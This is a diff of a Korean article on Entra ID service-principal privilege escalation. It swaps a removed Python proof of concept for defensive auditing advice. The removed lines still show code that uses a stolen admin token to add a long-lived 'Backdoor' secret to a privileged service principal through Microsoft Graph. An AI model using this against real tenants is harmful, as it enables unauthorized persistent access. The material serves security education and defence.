@@ -31,7 +31,7 @@ Microsoft Entra ID에서 애플리케이션 등록(App Registration)과 서비�
 
 이 공격이 어떻게 진행되는지 시각적으로 확인해 보겠습니다. 공격자는 권한 상승(Privilege Escalation)을 위해 이미 존재하는 높은 권한의 SP를 노립니다.
 
-```javascript
+```mermaid
 graph TD
     A[Attacker] --> B[Compromise Agent App Admin Account]
     B --> C[Enumerate Service Principals]
@@ -53,51 +53,14 @@ graph TD
 | **주요 공격 경로** | 피싱, 무차별 대입 공격 | 역할 권한 남용, 자격 증명 추가 |
 | **방어 요점** | MaaS 강제, 비밀번호 정책 | 앱 권한 최소화, 감사 로그 감시 |
 
-### Step-by-Step 공격 시뮬레이션 (PoC)
-> **⚠️ 윤리적 경고**: 아래 코드는 보안 연구 및 방어 목적의 학습용(Proof of Concept)입니다. 승인되지 않은 시스템에서 실행하는 것은 불법이며, 반드시 자신의 테넌트나 격리된 랩 환경에서만 실험해야 합니다.
+### 서비스 주체 자격 증명 변경 위험
 
 공격자는 이미 `Application Administrator` 권한을 가진 계정의 액세스 토큰을 획득했다고 가정합니다. 이제 공격자는 Microsoft Graph API를 사용하여 권한이 있는 서비스 주체를 찾고, 그곳에 새로운 비밀을 추가합니다.
 
 #### 1. 대상 서비스 주체 식별 및 자격 증명 추가
 
-이 파이썬 스크립트는 `requests` 라이브러리를 사용하여 대상 SP에 새로운 Client Secret을 추가하는 과정을 보여줍니다.
 
-```python
-import requests
-import json
-import datetime
-
-# Configuration (Simulated Environment)
-TARGET_TENANT_ID = "your-tenant-id"
-ATTACKER_ACCESS_TOKEN = "eyJ0eXAiOiJKV1QiLCJub25jZSI6..." # Token of App Admin
-TARGET_SP_OBJECT_ID = "11111111-2222-3333-4444-555555555555" # High Privilege SP
-
-GRAPH_API_BASE = f"https://graph.microsoft.com/v1.0/{TARGET_TENANT_ID}"
-
-headers = {
-    "Authorization": f"Bearer {ATTACKER_ACCESS_TOKEN}",
-    "Content-Type": "application/json"
-}
-
-# Step 1: Add a new password credential to the target Service Principal
-# Endpoint: POST /servicePrincipals/{id}/addPassword
-url = f"{GRAPH_API_BASE}/servicePrincipals/{TARGET_SP_OBJECT_ID}/addPassword"
-
-body = {
-    "passwordCredential": {
-        "displayName": f"Backdoor_{datetime.datetime.now().strftime('%Y%m%d%H%M')}",
-        "endDateTime": "2099-12-31T23:59:59Z"
-    }
-}
-
-try:
-    response = requests.post(url, headers=headers, json=body)
-    
-    if response.status_code == 200:
-        data = response.json()
-        secret_text = data.get('secretText')
-        print(f"[+] Success
-```
+관리자 권한으로 서비스 주체에 새 자격 증명을 추가할 수 있다면, 기존 비밀 값을 몰라도 해당 주체의 권한을 사용할 위험이 있다. 허가된 테넌트에서는 권한 할당과 자격 증명 추가 이벤트를 감사하고, 예기치 않은 변경을 조사해야 한다. 원래 API 요청 예시는 결과 처리 도중 잘려 있어 실행 가능한 PoC로 제시하지 않는다.
 
 ---
 
